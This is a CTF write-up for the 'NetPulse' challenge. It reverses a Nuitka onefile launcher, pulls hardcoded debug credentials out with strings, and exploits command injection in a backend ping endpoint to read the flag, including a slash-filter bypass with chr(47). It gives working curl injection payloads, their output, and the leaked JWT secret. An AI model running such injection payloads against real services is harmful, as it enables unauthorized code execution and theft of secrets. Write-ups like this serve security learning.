# NetPulse

## Description

NetPulse is a modern network monitoring thick client built with a proper 3-tier setup. Everything looks clean: client, backend, and the web layer doing the heavy lifting. It does what it’s supposed to. Mostly. But like any real-world tool, some features behave a little differently when pushed off the happy path. Figure out how it really works.

Flag format: HackZero{}

## Writeup

Both these binaries were simply launchers. The real challenge was the hidden packaged payload inside and how the backend handles the `ping` feature.

I began the challenge with the most important command... strings! This led me to the Nuitka onefile markers:

```asm
.rodata:000000000001D582 ; const char aNuitkaOnefileP[]
.rodata:000000000001D582 aNuitkaOnefileP db 'NUITKA_ONEFILE_PARENT',0
.rodata:000000000001D582                                         ; DATA XREF: main+22↑o
.rodata:000000000001D582                                         ; sub_1BD30:loc_1C194↑o

.rodata:000000000001D5C7 ; const char aNuitkaOnefileS[]
.rodata:000000000001D5C7 aNuitkaOnefileS db 'NUITKA_ONEFILE_START',0
.rodata:000000000001D5C7                                         ; DATA XREF: sub_1BD30:loc_1C0A0↑o

.rodata:000000000001D625 ; const char name[]
.rodata:000000000001D625 name            db 'NUITKA_ONEFILE_DIRECTORY',0
.rodata:000000000001D625                                         ; DATA XREF: main+6AC↑o
.rodata:000000000001D63E ; const char aNuitkaOriginal[]
.rodata:000000000001D63E aNuitkaOriginal db 'NUITKA_ORIGINAL_ARGV0',0
.rodata:000000000001D63E                                         ; DATA XREF: main+6C5↑o
```

So we end up with stuff like:

```text
NUITKA_ONEFILE_PARENT
NUITKA_ONEFILE_START
NUITKA_ONEFILE_DIRECTORY
NUITKA_ORIGINAL_ARGV0
/proc/self/exe
```

After this string xrefs exploring I began exploringg the `main` function.

The main function initializes the process by setting the `NUITKA_ONEFILE_PARENT` environment variable and invoking `sub_1BD30` to expand a runtime template such as `{TEMP}/onefile_{PID}_{TIME}`. It then resolves the path of the current executable using `sub_1BCA0`, opens it and memory maps it for processing. From the mapped file, the last eight bytes are interpreted as the payload length and stored in `qword_35B48` while the base address of the appended payload is calculated and stored in `qword_35B50`. Before proceeding, the code verifies the payload by checking that its first three bytes match the expected signature `K, A, Y`.

After validation, the program enters an extraction loop that continuously reads structured entries from the payload stream using functions like `sub_1A860` for `variable length data` and `sub_1A730` for `fixed size chunks`. Each entry contains metadata such as file paths, flags, sizes and corresponding data which are used to reconstruct the embedded files. The path of the first extracted executable is stored in `byte_2D660` and once extraction is complete the program launches this payload by calling `execv(byte_2D660, argv)`.

The key thing here is that the binary is not implementing NetPulse itself. It is only locating an appended blob inside itself, unpacking it into a temp directory and then executing the first extracted file.

The important loader logic rewritten from IDA pseudocode:

```c
fd = open(buf, O_RDONLY);
size = lseek(fd, 0, SEEK_END);
map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);

qword_35B48 = *(uint64_t *)&map[size - 8];
payload = &map[size - qword_35B48 - 8];

if (payload[0] != 'K' || payload[1] != 'A' || payload[2] != 'Y')
    sub_3870("Error, couldn't find attached data header.");

qword_35B50 = (uint64_t)(payload + 3);
sub_1BD30(byte_34AE0, "{TEMP}/onefile_{PID}_{TIME}", ...);

while (1) {
    sub_1A860(...);           // read next path string byte by byte
    if (!from[0])
        break;

    sub_1A860(...);           // read flags byte

    if (flags & 2) {
        sub_1A860(...);       // read symlink target
        symlink(from, to);
    } else {
        sub_1A730(..., 8u);   // read file size
        sub_1A730(..., chunk); // read file bytes
        fwrite(...);
    }

    if (flags & 1)
        fchmod(...);
}

setenv("NUITKA_ONEFILE_DIRECTORY", dirname(path), 1);
setenv("NUITKA_ORIGINAL_ARGV0", argv[0], 1);

if (fork() == 0)
    execv(byte_2D660, argv);
```

## Workflow

opens itself -> mmaps itself -> reads an appended payload -> verifies the `KAY` marker -> unpacks files into a temp directory -> executes the first extracted file

---

<br>

Coming back to the temp directory expansion `sub_1BD30` tells us how the [runtime extraction directory](../images/vmmap.png) is built.

By reading its branches:

- `{TEMP}` comes from `TMPDIR` falling back to `/tmp`
- `{PID}` comes from `NUITKA_ONEFILE_PARENT` if present otherwise `getpid()`
- `{TIME}` comes from `NUITKA_ONEFILE_START` if already set otherwise `gettimeofday()`
- `{PROGRAM}` and `{PROGRAM_BASE}` are derived from the current executable path using `sub_1BCA0`

Because the loader cleans up after itself, the cleanest approach is to control `TMPDIR`, let the launcher unpack into a directory we own and copy the payload out before cleanup happens.

```bash
mkdir -p cheentapakdumdum

TMPDIR="$PWD/cheentapakdumdum" ./NetPulse >/dev/null 2>&1 
```

The extraction directory contained 76 entries. The useful ones were:

```bash
main.bin

libpython3.11.so.1.0
libpyside6.abi3.so.6.10
libQt6Core.so.6
libQt6Network.so.6
libQt6Widgets.so.6
PySide6/
shiboken6/
certifi/
zstandard/
```

```bash
main.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=26d232577e65e7471bf0ae6acb6515e906e49df7, for GNU/Linux 3.2.0, stripped
```

This gives proof that the launcher is unpacking a second ELF along the Python and Qt runtime it needs.

Looking at [important strings](../images/ping.png) of main.bin

```text
uhttps://network.pphreak1001.tech/api
u/login
u/tools/ping
u/tools/nslookup
u/tools/speedtest
u/tools/ipinfo
uauth.json
u.netdiag
```

That itself gave me some context:

- backend base URL `https://network.pphreak1001.tech/api`
- login route `/login`
- tool routes `/tools/ping`, `/tools/nslookup`, `/tools/speedtest`, `/tools/ipinfo` (why are these in the client binary :raised_eyebrow:)
- local token cache `.netdiag/auth.json`

[More strings](../images/auth.png) because if i hit decompile all in IDA my fans will go wroooom and my laptop boooom (but with positions)

```text
18835888 uutils.storage
18835905 aload_token
18835917 uhttps://network.pphreak1001.tech/api
18835975 ucore/api.py
18836082 u/login
18836122 aaccess_token
18836136 asave_token
18836160 aclear_token
18836173 aload_token
18836323 ucore/auth.py
18836566 u/tools/ping (aha ping is seperated from the other 3, must be having some special handling)
18836610 uUnknown error
18836625 uError connecting to backend:
18836675 u/tools/nslookup
18836708 u/tools/speedtest
18836743 u/tools/ipinfo
```

Using these strings I deduced the client module layout roughly as:

- `core/api.py`
- `core/auth.py`
- `utils.storage`

While exploring the binary I also looked at how client [stores and loads bearer tokens](../images/creds.png).

```text
19327749 aUsername
19327777 aPassword
19327894 aAuthenticate
19327997 uPlease enter credentials.
19328050 uAuthenticating...
19328102 uInvalid credentials.
19328375 ucore.auth
19328493 uui.login_view
19328522 an3tw0rk_op3r4tor
19328540 a_DEBUG_U
19328550 ud14gnos1s3xp3rtahahahaha@@!
19328579 a_DEBUG_P
19328666 uui/login_view.py
```

Connecting the dots for you:

- the login dialog is implemented in `ui/login_view.py`
- the login flow calls into `core.auth`
- there is a debug username field `_DEBUG_U` and the username is plainly visible as `n3tw0rk_op3r4tor`
- there is a debug password field `_DEBUG_P` and the password is plainly visible as `d14gnos1s3xp3rtahahahaha@@!`

Who needs IDA when you have strings hehe. Anyways, the storage block is something like:

```text
19332111 aAPPDATA
19332120 aexpanduser
19332134 w~aXDG_CONFIG_HOME
19332159 u.config
19332168 aAPP_DIR_NAME
19332218 uauth.json
19332316 u.netdiag
19332392 uutils/storage.py
```

Enough with these strings I got pissed so I eventually did go back to IDA decompilation... and then ended up looking at strings again in IDA because of how much stuff was in .rodata plainly and I was losing my lead on leaderboard. UNACCEPTABLE and now im too lazy to analyse it but it should be something like:

```c
static const char *API_BASE_URL = "https://network.pphreak1001.tech/api";
AsyncClient *get_client(void) {
    char *token;
    Map *headers;
    token = load_token();
    headers = new_map();
    if (token && *token) {
        headers["Authorization"] = concat("Bearer ", token);
    }
    return httpx.AsyncClient(
        base_url = API_BASE_URL,
        headers  = headers,
        timeout  = ...,
        verify   = ...
    );
}
```

```c
bool login(char *username, char *password) {
    AsyncClient *client = get_client();
    Response *response;
    response = client->post("/login", data = {
        "username": username,
        "password": password
    });
    if (response->status_code == 200) {
        save_token(response->json()["access_token"]);
        return true;
    }
    clear_token();
    return false;
}
```

At this point strings have already told us where to go and what credentials to try.

```bash
curl -X POST 'https://network.pphreak1001.tech/api/login' --data 'username=n3tw0rk_op3r4tor&password=d14gnos1s3xp3rtahahahaha@@!'
```

```json
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuM3R3MHJrX29wM3I0dG9yIiwiZXhwIjoxNzc0ODg2NDA3fQ.LoUjHQV8HWj5LoX_jGvaMXHfYzjRRQvCIAXjaJEDmXs","token_type":"bearer"}
```

Then running the most advanced tool of them all... the ping tool as deduced before.

```bash
curl 'https://network.pphreak1001.tech/api/tools/ping' -H "Authorization: Bearer $YOURTOKENHERE" -H 'Content-Type: application/json' -d '{"target":"127.0.0.1; id"}'
```

Cleaning the dirty output:

```bash
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.023 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3065ms
rtt min/avg/max/mdev = 0.015/0.021/0.023/0.003 ms

uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

So we have RCE as `appuser`.

I then used the same endpoint to read the backend files from the current working directory. `pwd` showed `/app` and ls showed 3 entries: `main.py`, `requirements.txt` and `tools.py`.

---

Important parts of `main.py`:

```python
SECRET_KEY = "super_secret_diagnostics_key_never_guess_ahahahaha"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/login")

VALID_USERNAME = "n3tw0rk_op3r4tor"
VALID_PASSWORD = "d14gnos1s3xp3rtahahahaha@@!"
```

The important thing here is that the JWT secret is `super_secret_diagnostics_key_never_guess_ahahahaha`

---

Important parts of `tools.py`:

```python
def is_valid_target(target: str) -> bool:
    if not target or len(target) > 255:
        return False
    return True

async def get_ping(target: str):
    if not is_valid_target(target):
        return {"error": "Invalid target format"}

    param = '-n' if platform.system().lower()=='windows' else '-c'
    target = target.split("://")[-1].split("/")[0]
    command = f'ping {param} 4 {target}'

    process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
```

This is the bug. The validation only checks for non empty input and length <= 255. Shell metacharacters are not escaped. `target` is passed straight into `create_subprocess_shell`. The only transformation is `split("://")[-1].split("/")[0]`.

That single line is the reason command injection works and also the reason `/flag.txt` is a little annoying to read.

But first the task was to locate the flag.

```bash
curl 'https://network.pphreak1001.tech/api/tools/ping' -H "Authorization: Bearer $YOURTOKENHERE" -H 'Content-Type: application/json' -d '{"target":"127.0.0.1; ls -la .."}'
```

```bash
drwxr-xr-x   1 root root 4096 Mar 21 11:03 app
-rw-r--r--   1 root root   43 Mar 21 11:03 flag.txt
drwxr-xr-x   1 root root 4096 Mar 21 11:03 home
```

So the flag is in `/flag.txt` viewed from `/app` as `../flag.txt`.

But now since the server does `split("/")[0]`, any literal slash in the payload gets chopped off. So we can’t just do `cat ../flag.txt` because the server will chop it to `cat ..flag.txt` which is not what we want.

The fix is to create the slash at runtime after the `.split("/")` logic is done.

This worked cleanly:

```bash
curl 'https://network.pphreak1001.tech/api/tools/ping' -H "Authorization: Bearer $YOURTOKENHERE" -H 'Content-Type: application/json' \
-d "$(python3 - <<'PY'
import json
cmd = '127.0.0.1; python3 -c "s=chr(47);print(open(\'..\'+s+\'flag.txt\').read())"'
print(json.dumps({"target": cmd}))
PY
)"
```

```bash
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.018 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.024 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.021 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3082ms
rtt min/avg/max/mdev = 0.013/0.019/0.024/0.004 ms

HackZero{c5ce165f3393bd0bfafab77bd8ac8569}
```

> After the CTF, I realised that there is already a tool to extract nuitka compiled Python executables so um I did not HAVE to reverse the loader and stuff myself and I could just use `https://github.com/extremecoders-re/nuitka-extractor` but that does not sound as fun :P

## Flag

`HackZero{c5ce165f3393bd0bfafab77bd8ac8569}`
